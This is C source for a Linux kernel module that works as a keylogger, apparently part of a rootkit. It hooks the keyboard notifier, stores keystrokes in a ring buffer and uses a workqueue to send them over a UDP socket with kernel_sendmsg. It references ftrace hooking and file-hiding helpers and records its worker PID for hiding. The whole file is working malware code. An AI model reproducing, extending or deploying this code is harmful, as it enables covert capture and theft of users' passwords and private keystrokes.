#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/atomic.h>
#include <linux/in.h>
#include <linux/inet.h>
#include "logger.h"
#include "keymap.h"
#include "ports.h"
#include "ftrace_helper.h"
#include "hide_files.h" // for pid buffers
// declarations:
int logger_hook(struct notifier_block *nblock, unsigned long val, void *v);
void code_to_string(int keycode, int shift_mask, char *buf);
void send_data_to_socket(int from, int to);
// variables:
int write_index = 0;
static int read_index = 0;
char keys[BUF_LEN];
// workqueue
struct workqueue_struct *logger_wq;
static atomic_t pending_jobs = ATOMIC_INIT(0);
static struct logger_work
{
    struct work_struct work;
    int from;
    int to;
};
struct notifier_block logger_blk = {
    .notifier_call = logger_hook,
};
extern struct socket *sock;

void code_to_string(int keycode, int shift_mask, char *buf)
{
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
    {
        const char *us_key = (shift_mask == 1)
                                 ? us_keymap[keycode][1]
                                 : us_keymap[keycode][0];

        snprintf(buf, KEY_LEN, "%s", us_key);
    }
}

void send_data_to_socket(int from, int to)
{
    struct msghdr msg;
    struct kvec vec;
    struct sockaddr_in dest_addr;
    int sent_bytes;
    char message[to - from];
    size_t len = to - from;
    memcpy(message, keys + from, to - from);
    // setting up the destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_KEYS_DEST);          // Remote port
    dest_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Loopback for testing
    // setting up message header and iovec
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &dest_addr;
    msg.msg_namelen = sizeof(dest_addr);

    vec.iov_base = message;
    vec.iov_len = len;

    // sending the message
    sent_bytes = kernel_sendmsg(sock, &msg, &vec, 1, len);
    if (sent_bytes < 0)
    {
        pr_err("Failed to send message, error %d\n", sent_bytes);
        return;
    }

    pr_info("Sent %d bytes: %s\n", sent_bytes, message);
    return;
}

// runs in kthread context
static void logger_work_handler(struct work_struct *work)

{
    // copy current pid to buffer, this is the worker thread
    sprintf(keys_worker, "%d", current->group_leader->pid);

    struct logger_work *lw = container_of(work, struct logger_work, work);

    // send the data from starting index to ending index
    send_data_to_socket(lw->from, lw->to);

    // free the work item and decrement the pending jobs count, as this job is done 
    kfree(lw);
    atomic_dec(&pending_jobs);
}
int logger_hook(struct notifier_block *nblock, unsigned long val, void *v)
{
    size_t len;
    char keybuf[KEY_LEN] = {0};
    struct keyboard_notifier_param *param = v;

    if (!(param->down))
    {
        return NOTIFY_OK;
    }
    code_to_string(param->value, param->shift, keybuf);
    len = strlen(keybuf);

    // can't write more, restart write index as in a ring buffer
    if ((write_index + len) >= BUF_LEN)
    {
        write_index = 0;
        read_index = 0;
    }
    strncpy(keys + write_index, keybuf, len);
    write_index += len;
    if (write_index - read_index >= PACKET_DATA_SIZE)
    {

        // try to  generate workqueue job with write_index, read_index
        // atomic_add_unless is used to check if we can add more jobs to the queue
        if (atomic_add_unless(&pending_jobs, 1, MAX_PENDING_JOBS_KEYS))
        {
            struct logger_work *work = kmalloc(sizeof(struct logger_work), GFP_ATOMIC);
            if (work)
            {
                INIT_WORK(&work->work, logger_work_handler);
                work->from = read_index;
                work->to = write_index;
                read_index = write_index;

                // queue the work
                queue_work(logger_wq, &work->work);
            }
            else
            {
                atomic_dec(&pending_jobs);
            }

            read_index = write_index;
        }
    }

    return NOTIFY_OK;
}